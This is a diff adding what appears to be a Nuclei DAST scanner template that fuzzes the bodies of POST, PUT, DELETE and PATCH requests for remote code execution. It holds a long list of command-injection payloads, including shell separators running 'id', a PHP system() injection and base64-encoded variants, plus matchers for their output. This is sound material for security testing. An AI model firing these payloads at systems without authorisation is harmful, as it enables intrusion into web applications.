@@ -1,0 +1,134 @@
+id: rce-body
+
+info:
+  name: Remote Code Execution
+  author: reewardius
+  severity: critical
+  tags: fuzzing-req,fuzzing-req-rce,fuzzing-req-body-query,fuzzing-req-rce-body-query,fuzzing-req-body,rce,dast
+  
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "POST"'
+          - 'method == "PUT"'
+          - 'method == "DELETE"'
+          - 'method == "PATCH"'
+        condition: or
+        
+    payloads:
+      rce:
+        - '||/usr/bin/id||'
+        - '$;id'
+        - "1;id"
+        - ';";id'
+        - ';";id;'
+        - "& `id`"
+        - "& id &"
+        - "& id"
+        - "&$(id)"
+        - "&& id"
+        - "&&$(id)"
+        - "&&`id`"
+        - "&&id"
+        - "&&id&&"
+        - "&`id`"
+        - "&id"
+        - "&id&"
+        - ");id"
+        - ");id;"
+        - ");id|"
+        - ")id "
+        - ")|id"
+        - ")|id;"
+        - "; $(id)"
+        - "; `id` #"
+        - "; `id`"
+        - "; id"
+        - "; id;"
+        - "; id\n"
+        - "; id|"
+        - "; |id|"
+        - "\n&&id"
+        - "\n;id"
+        - "\nid"
+        - "\nid\n"
+        - "\n||$(id)"
+        - "\n||`id`"
+        - "\n||id"
+        - "\r&&id"
+        - "\r;id"
+        - "\r\n&&id&&"
+        - "\r\n;id"
+        - "\r\n||$(id)"
+        - "\r\n||`id`"
+        - "\r\n||id"
+        - "\r\n||id||"
+        - "\r||$(id)"
+        - "\r||`id`"
+        - "\r||id"
+        - "a);id"
+        - "a);id|"
+        - "a;id"
+        - "a;id;"
+        - "| `id` #"
+        - "| `id`"
+        - "| id"
+        - "|id"
+        - "|id;"
+        - "|id|"
+        - "|| `id` #"
+        - "|| `id`"
+        - "|| id"
+        - "||$(id)"
+        - "||$(id);"
+        - "||$(id)||"
+        - "||`id`"
+        - "||`id`||"
+        - "||id"
+        - "||id;"
+        - "||id|"
+        - "||id||"
+        - '"><?php echo system("id");?>'
+        - '; echo `id`;'
+        - '; echo exec(id);'
+        - 'echo exec(id);'
+        - 'YGlkYA=='
+        - 'O2BpZGA7'
+        - 'O2lkOw=='
+        - 'fHxgaWRgfHw='
+        - 'JiZpZCYm'
+        
+    fuzzing:
+      - part: body
+        type: replace
+        mode: single
+        fuzz:
+          - "{{rce}}"
+          
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "'id' is not recognized as an internal or external command"
+          - "syntax error near unexpected token `"
+        condition: or
+        
+      - type: word
+        part: body
+        words:
+          - "uid="
+          - "gid="
+        condition: and
+        
+      - type: word
+        part: body
+        words:
+          - "PHP Extension"
+          - "PHP Version"
+        condition: and
+        
+      - type: word
+        words:
+          - "This is perl"
